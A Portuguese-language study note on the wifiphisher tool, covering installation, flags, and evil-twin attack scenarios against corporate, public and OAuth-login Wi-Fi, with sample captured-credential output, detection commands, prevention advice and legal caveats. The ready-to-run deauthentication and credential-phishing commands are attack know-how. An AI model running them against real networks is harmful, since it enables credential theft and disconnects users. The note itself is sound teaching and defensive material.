2025-09-04 10:10

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Redes de Computadores]] | [[Redes]] | [[Wi-Fi]] | [[Ponto de Acesso]] | [[Ferramentas]] | [[wifiphisher]] | [[Phishing]]

----
# Introdução

O **wifiphisher** é uma ferramenta de segurança que automatiza ataques de phishing em redes Wi-Fi, criando pontos de acesso falsos e páginas de login convincentes para capturar credenciais. É amplamente utilizado em testes de penetração para demonstrar vulnerabilidades humanas.

---
# O que é o wifiphisher?

## Definição e Propósito

Wifiphisher é um framework de ataques de phishing Wi-Fi que:

- Cria pontos de acesso falsos (Evil Twin)
- Realiza ataques de deautenticação
- Apresenta páginas de phishing personalizadas
- Captura credenciais automaticamente

**Objetivo Principal:** Demonstrar vulnerabilidades em processos de autenticação e conscientizar usuários sobre segurança Wi-Fi

## Características Principais

- **Automatização completa** do processo de phishing.
- **Templates pré-built** para diversos cenários.
- **Interface intuitiva** baseada em menus.
- **Suporte a múltiplos** tipos de ataques.
- **Geração automática** de certificados SSL falsos.

---
# Instalação e Configuração

## Instalação no Kali Linux

```bash
# Método 1: Via apt (versão estável)
sudo apt update
sudo apt install wifiphisher

# Método 2: Via GitHub (versão mais recente)
sudo apt install python3-pyric python3-django python3-netaddr python3-bs4
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher
sudo python3 setup.py install

# Verificar instalação
wifiphisher --help
```

## Dependências e Requisitos

- **Interfaces de rede**: Pelo menos duas interfaces wireless (uma para AP, outra para deautenticação)  
- **Sistema**: Linux com drivers compatíveis  
- **Python**: Versão 3.6 ou superior  
- **Ferramentas**: hostapd, dnsmasq, iptables

---
# Funcionamento Técnico

## Arquitetura do Wifiphisher

```text
Interface 1 (Monitor) → Deautenticação de clientes
       ↓
Interface 2 (AP) → Criação do Evil Twin
       ↓
Servidor Web → Páginas de phishing
       ↓
Servidor DNS → Redirecionamento de tráfego
       ↓
Captura de Credenciais → Armazenamento local
```

## Componentes Principais

- **hostapd**: Criação do ponto de acesso
- **dnsmasq**: Servidor DHCP e DNS    
- **iptables**: Redirecionamento de tráfego
- **Python**: Lógica de negócio e servidor web

---
# Modos de Uso e Comandos

## Modo Básico de Operação

```bash
# Execução simples (interface automática)
sudo wifiphisher

# Com parâmetros específicos
sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade
```

## Parâmetros Principais

```bash
# Especificar interfaces
-aI, --auth-interface    Interface para AP
-jI, --jamming-interface Interface para deautenticação

# Selecionar template de phishing
-p, --phishing-pages    Template específico
-l, --list-phishings    Listar templates disponíveis

# Opções de rede
-e, --essid             Nome personalizado para o AP
-c, --channel           Canal wireless específico

# Opções de deautenticação
-d, --deauth            Número de pacotes de deautenticação
-n, --no-deauth         Desativar deautenticação
```

---
## Templates de Phishing Disponíveis

## Templates Comuns

```bash
# Listar todos os templates
wifiphisher -l

# Exemplos de templates:
- firmware-upgrade      # Atualização de firmware
- portal                # Portal cativo genérico
- oauth-login           # Login OAuth (Google/Facebook)
- wifi-connect          # Conexão Wi-Fi simples
- web-network           # Provedor de internet
- support               # Suporte técnico
```

## Estrutura de um Template

```text
/usr/share/wifiphisher/phishing-pages/
└── template-name/
    ├── index.html      # Página principal
    ├── login.php       # Processamento de login
    ├── css/            # Estilos
    ├── js/             # JavaScript
    └── images/         # Imagens
```

---
# Cenários Práticos de Uso

## Cenário 1: Ataque a Rede Corporativa

```bash
# Usar template de portal corporativo
sudo wifiphisher -aI wlan1 -jI wlan0 -p portal -e "Corp-Secure-WiFi" -c 6

# Explicação dos parâmetros:
# -aI wlan1: Interface para AP falso
# -jI wlan0: Interface para deautenticação
# -p portal: Template corporativo
# -e "Corp-Secure-WiFi": SSID personalizado
# -c 6: Canal específico
```

## Cenário 2: Ataque a Rede Pública

```bash
# Template de provedor de internet
sudo wifiphisher -p web-network -e "Airport-Free-WiFi" --no-deauth

# --no-deauth: Modo passivo (sem deautenticação ativa)
```

## Cenário 3: Ataque com SSL

```bash
# Forçar HTTPS com certificado falso
sudo wifiphisher -p oauth-login --force-ssl

# --force-ssl: Gerar certificado SSL automático
```

---
# Saídas e Resultados

## Saída durante a Execução

```bash
[*] Starting Wifiphisher 1.4GIT 
[*] Niceness set to -10
[*] Cleaning up and setting up the environment
[*] Selecting the wireless interfaces automatically
[+] Selecting wlan0 for jamming and wlan1 for the access point
[*] Setting up the access point...
[+] AP interface: wlan1
[+] AP SSID: Starbucks-Free-WiFi
[+] AP channel: 6
[*] Setting up the phishing web server...
[+] Server: 192.168.2.1:80
[*] Starting the HTTP and DNS servers...
[*] Starting the access point...
[*] Sending deauthentication packets to the clients...
[+] Captured credentials: user@example.com:password123
[+] Captured credentials: johndoe:securepass456
```

## Arquivos de Saída

```bash
# Credenciais capturadas
/tmp/wifiphisher-webserver-credentials.txt

# Logs detalhados
/var/log/wifiphisher.log

# Arquivos temporários
/tmp/wifiphisher-*
```

## Exemplos de Credenciais Capturadas

```text
2024-01-01 14:30:22 - IP: 192.168.2.105 - User: maria.silva - Password: Senha@123
2024-01-01 14:32:45 - IP: 192.168.2.110 - User: joao.santos - Password: 123mudar
2024-01-01 14:35:12 - IP: 192.168.2.115 - User: admin - Password: admin123
```

---
# Fluxo Completo do Ataque

## Fase 1: Reconhecimento

```bash
# Detecção automática de redes
[*] Scanning for target networks...
[+] Found 5 networks:
    1. Home-Network (WPA2, CH6, -45dBm)
    2. Office-Secure (WPA2, CH11, -55dBm)
    3. Cafe-Free (Open, CH1, -60dBm)
```

## Fase 2: Configuração

```bash
# Setup automático do ambiente
[*] Setting up AP on wlan1 with SSID 'Cafe-Free'
[*] Configuring DHCP server...
[*] Starting DNS spoofing...
```

## Fase 3: Execução

```bash
# Ataque em andamento
[*] Deauthenticating clients from target network...
[*] Waiting for clients to connect to the phishing AP...
[+] Client connected: AA:BB:CC:DD:EE:FF
[*] Serving phishing page to client...
```

## Fase 4: Captura

```bash
# Sucesso na captura
[+] Credentials captured from AA:BB:CC:DD:EE:FF
[+] User: john@example.com
[+] Password: MySecurePassword!
```

---
# Técnicas de Detecção e Prevenção

## Como Detectar um Ataque Wifiphisher?

**Sinais de Alerta:**

- Dois APs com o mesmo SSID
- Redirecionamentos HTTP suspeitos
- Certificado SSL não confiáveis
- Solicitação de credenciais incomum

**Comandos de detecção:**

```bash
# Verificar APs duplicados
sudo airodump-ng wlan0 | grep -i "Cafe-Free"

# Verificar certificados SSL
openssl s_client -connect 192.168.2.1:443 | openssl x509 -text
```

## Medidas de Prevenção

**Para usuários:**

- Verificar sempre URLs e HTTPS
- Desconfiar de solicitações de logins inesperadas.
- Usar VPN em redes públicas
- Verificar certificados digitais

**Para administradores:**

- Implementar WPA3-Enterprise
- Configurar 802.1x com autenticação mútua
- Monitorar APs duplicados
- Educar usuários sobre phishing

---
# Considerações Legais e Éticos

>[!info] Uso Legítimo
>- Apenas em ambientes controlados
>- Com autorização por escrito
>- Para testes de segurança
>- Com relatório de vulnerablidade

>[!warning] Conformidade Legal
>- **Obter permissão** antes de testar
>- **Documentar** todas as atividades
>- **Não coletar** dados pessoais reais
>- **Proteger** informações capturadas
>- **Reportar** vulnerabilidades encontradas

---
# Solução de Problemas

## Erros Comuns e Soluções

**Problema:** Interface não suporta modo AP

```bash
# Verificar compatibilidade
iw list | grep "AP\|AP/VLAN"

# Usar interface diferente
sudo wifiphisher -aI wlan1 -jI wlan0
```

**Problema:** Conflito com NetworkManager

```bash
# Parar serviços conflitantes
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
```

**Problema:** Template não carrega

```bash
# Verificar templates disponíveis
wifiphisher -l

# Reinstalar templates
sudo python3 setup.py install
```

---
# Recursos e Referências

## Documentação Oficial

- [GitHub Repository](https://github.com/wifiphisher/wifiphisher)
- [Official Documentation](https://wifiphisher.org/)
- [Kali Tools Page](https://www.kali.org/tools/wifiphisher/)

## Tutoriais e Guias

- [Video Tutorials](https://www.youtube.com/results?search_query=wifiphisher+tutorial)
- [Advanced Usage Guide](https://www.kalilinux.in/2021/05/wifiphisher-tutorial.html)
- [Community Forum](https://forums.kali.org/)

## Ferramentas Relacionadas

- **Airgeddon**: Framework completo de testes wireless
- **Fluxion**: Alternative to Wifiphisher
- **Linset**: Script automatizado de phishing Wi-Fi

---
# Conclusão

O Wifiphisher é uma ferramenta poderosa para testes de segurança, mas deve ser usada com responsabilidade e sempre dentro dos limites legais. O conhecimento dessas técnicas ajuda a desenvolver melhores medidas de proteção contra ataques reais.